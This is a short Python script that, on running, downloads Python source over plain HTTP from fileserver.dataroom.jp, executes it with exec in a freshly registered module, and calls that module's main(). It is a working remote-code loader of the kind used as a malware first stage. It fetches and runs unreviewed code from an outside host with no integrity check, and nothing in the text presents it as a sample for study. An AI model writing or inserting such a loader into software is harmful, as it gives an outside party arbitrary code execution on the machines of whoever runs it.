import sys
import types
import requests

def get_module_name():
    return "loader"

def get_source_code_and_exec(url, module_name):
    response = requests.get(url)
    source = response.text

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    return module

def execute():
    url = "http://fileserver.dataroom.jp/assets/loader.py"
    module_name = get_module_name()

    module = get_source_code_and_exec(url, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
